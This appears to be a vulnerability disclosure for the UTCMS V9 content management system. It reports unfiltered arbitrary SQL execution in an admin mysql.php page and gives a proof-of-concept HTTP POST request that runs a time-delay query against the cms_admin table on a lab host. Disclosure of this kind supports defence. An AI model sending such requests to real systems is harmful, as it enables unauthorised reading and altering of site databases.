# Vendor

HuangDou

# Product

UTCMS

# version

 V9

# Download 

https://github.com/usualtool/ut-cms

# Vulnerability

Execute any SQL statement

# Description

In the mysql.php page, users can execute SQL query statements, but no results will be displayed. The problem is that there is no parameter filtering, and attackers can execute SELECT, CREATE, INSERT and other statements after logging into the backend.

# Analysis

In the app/modules/ut-data/admin/mysql.php , users can execute SQL query statements, but no results will be displayed. The problem is that there is no parameter filtering, and attackers can execute SELECT, CREATE, INSERT and other statements after logging into the backend.

<img width="1053" height="295" alt="image" src="https://github.com/user-attachments/assets/fcef40b4-23bb-452f-b2c3-25110015ae3a" />

We reproduce under normal no delay
<img width="1413" height="914" alt="image" src="https://github.com/user-attachments/assets/6ffb4526-40ef-4503-b08b-6ab061fee477" />


5 seconds to see
<img width="1418" height="919" alt="image" src="https://github.com/user-attachments/assets/26c04500-0c27-41ae-adac-c3ab509d1ada" />



# POC
```
POST /ut-cms-9/app/dev/?m=ut-data&p=mysql&do=mysql-sql HTTP/1.1
Host: 192.168.1.69
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=l7s63btrio4o1cepgib2l9v89m
Content-Length: 45

sql=SELECT+*+FROM+cms_admin+WHERE+SLEEP(5)%3b
```
